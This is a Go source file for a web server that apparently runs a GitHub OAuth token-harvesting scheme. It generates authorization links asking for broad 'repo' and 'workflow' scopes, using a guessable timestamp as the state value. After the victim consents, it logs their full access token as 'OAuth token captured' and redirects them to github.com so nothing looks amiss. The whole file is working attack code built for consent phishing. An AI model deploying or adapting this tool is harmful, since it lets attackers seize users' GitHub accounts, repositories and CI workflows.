package main

import (
	"context"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/google/go-github/v55/github"
	"github.com/gorilla/mux"
	"github.com/joho/godotenv"
	"github.com/sirupsen/logrus"
	"golang.org/x/oauth2"
)

const (
	// OAuth configuration
	oauthAuthURL  = "https://github.com/login/oauth/authorize"
	oauthTokenURL = "https://github.com/login/oauth/access_token"
	oauthScopes   = "user:email read:user repo workflow"

	// Default configuration values
	defaultPort          = "3000"
	defaultAppURL        = "http://localhost:3000/"
	defaultRedirectURL   = "https://github.com"
	defaultGenerateRoute = "/generate"
	defaultCallbackRoute = "/callback"
)

// Config holds the application configuration
type Config struct {
	Port          string
	ClientID      string
	ClientSecret  string
	AppURL        string
	RedirectURL   string
	GenerateRoute string
}

// OAuthApp represents our OAuth App instance
type OAuthApp struct {
	config *Config
	logger *logrus.Logger
}

func main() {
	// Load .env file if it exists
	if err := godotenv.Load(); err != nil {
		log.Println("No .env file found, using environment variables")
	}

	// Initialize logger
	logger := logrus.New()
	logger.SetLevel(logrus.InfoLevel)
	logger.SetFormatter(&logrus.TextFormatter{
		FullTimestamp: true,
	})

	// Load configuration
	config := &Config{
		Port:          getEnv("PORT", defaultPort),
		ClientID:      getEnv("CLIENT_ID", ""),
		ClientSecret:  getEnv("CLIENT_SECRET", ""),
		AppURL:        getEnv("APP_URL", defaultAppURL),
		RedirectURL:   getEnv("REDIRECT_URL", defaultRedirectURL),
		GenerateRoute: getEnv("GENERATE_ROUTE", defaultGenerateRoute),
	}

	// Validate configuration
	if err := validateConfig(config); err != nil {
		logger.WithError(err).Fatal("Configuration validation failed")
	}

	// Initialize OAuth App
	app := &OAuthApp{
		config: config,
		logger: logger,
	}

	// Setup routes
	router := mux.NewRouter()
	router.HandleFunc(defaultCallbackRoute, app.handleCallback).Methods("GET")
	router.HandleFunc(config.GenerateRoute, app.handleGenerateURL).Methods("GET")

	// Start server
	logger.WithField("port", config.Port).Info("Starting OAuth App server")
	if err := http.ListenAndServe(":"+config.Port, router); err != nil {
		logger.WithError(err).Fatal("Server failed to start")
	}
}

// Helper functions
func getEnv(key, defaultValue string) string {
	if value := os.Getenv(key); value != "" {
		return value
	}
	return defaultValue
}

// validateConfig validates the configuration values
func validateConfig(config *Config) error {
	if config.ClientID == "" {
		return fmt.Errorf("CLIENT_ID is required")
	}
	if config.ClientSecret == "" {
		return fmt.Errorf("CLIENT_SECRET is required")
	}
	if _, err := url.Parse(config.AppURL); err != nil {
		return fmt.Errorf("APP_URL must be a valid URL: %w", err)
	}
	if _, err := url.Parse(config.RedirectURL); err != nil {
		return fmt.Errorf("REDIRECT_URL must be a valid URL: %w", err)
	}
	if config.GenerateRoute == "" {
		return fmt.Errorf("GENERATE_ROUTE cannot be empty")
	}
	if !strings.HasPrefix(config.GenerateRoute, "/") {
		config.GenerateRoute = "/" + config.GenerateRoute
	}
	return nil
}

// handleCallback handles OAuth callback from GitHub
func (app *OAuthApp) handleCallback(w http.ResponseWriter, r *http.Request) {
	app.logger.Info("OAuth callback received")

	// Get authorization code
	code := r.URL.Query().Get("code")
	if code == "" {
		app.logger.Error("OAuth callback received without authorization code")
		http.Error(w, "Authorization code is required", http.StatusBadRequest)
		return
	}

	// Create OAuth2 config
	redirectURL, _ := url.JoinPath(app.config.AppURL, defaultCallbackRoute)
	oauthConfig := &oauth2.Config{
		ClientID:     app.config.ClientID,
		ClientSecret: app.config.ClientSecret,
		RedirectURL:  redirectURL,
		Scopes:       strings.Split(oauthScopes, " "),
		Endpoint: oauth2.Endpoint{
			AuthURL:  oauthAuthURL,
			TokenURL: oauthTokenURL,
		},
	}

	// Exchange code for token
	ctx := context.Background()
	token, err := oauthConfig.Exchange(ctx, code)
	if err != nil {
		app.logger.WithError(err).Error("Failed to exchange authorization code for access token")
		http.Error(w, "Failed to exchange authorization code", http.StatusInternalServerError)
		return
	}

	// Get user information
	client := github.NewClient(oauthConfig.Client(ctx, token))
	user, _, err := client.Users.Get(ctx, "")
	if err != nil {
		app.logger.WithError(err).Error("Failed to retrieve user information from GitHub API")
		http.Error(w, "Failed to retrieve user information", http.StatusInternalServerError)
		return
	}

	// Log captured OAuth token (including the actual token)
	app.logger.WithFields(logrus.Fields{
		"user_login":   user.GetLogin(),
		"user_id":      user.GetID(),
		"access_token": token.AccessToken,
		"token_type":   token.TokenType,
		"expires_at":   token.Expiry,
		"scope":        token.Extra("scope"),
		"timestamp":    time.Now().UTC(),
	}).Info("OAuth token captured")

	// Log successful token capture and redirect
	app.logger.WithFields(logrus.Fields{
		"user_login":   user.GetLogin(),
		"user_id":      user.GetID(),
		"redirect_url": app.config.RedirectURL,
	}).Info("OAuth token captured, redirecting user")

	// Redirect to success URL with 302 status
	http.Redirect(w, r, app.config.RedirectURL, http.StatusFound)
}

// handleGenerateURL generates and returns a GitHub OAuth authorization URL
func (app *OAuthApp) handleGenerateURL(w http.ResponseWriter, r *http.Request) {
	app.logger.Info("OAuth URL generation requested")

	// Check if OAuth is configured
	if app.config.ClientID == "" {
		app.logger.Error("OAuth configuration incomplete - CLIENT_ID not set")
		http.Error(w, "OAuth service is not properly configured", http.StatusServiceUnavailable)
		return
	}

	// Generate state parameter using current timestamp
	state := fmt.Sprintf("%d", time.Now().Unix())

	// Generate the OAuth URL
	redirectURL, _ := url.JoinPath(app.config.AppURL, defaultCallbackRoute)

	// Build URL parameters
	params := url.Values{}
	params.Set("client_id", app.config.ClientID)
	params.Set("redirect_uri", redirectURL)
	params.Set("scope", oauthScopes)
	params.Set("state", state)

	// Construct the full OAuth URL
	baseURL, _ := url.Parse(oauthAuthURL)
	baseURL.RawQuery = params.Encode()
	oauthURL := baseURL.String()

	// Log the URL generation
	app.logger.WithFields(logrus.Fields{
		"client_id":     app.config.ClientID,
		"redirect_url":  app.config.AppURL,
		"state":         state,
		"generated_url": oauthURL,
	}).Info("OAuth URL generated")

	// Return the URL as plain text
	w.Header().Set("Content-Type", "text/plain")
	w.Write([]byte(oauthURL))
}
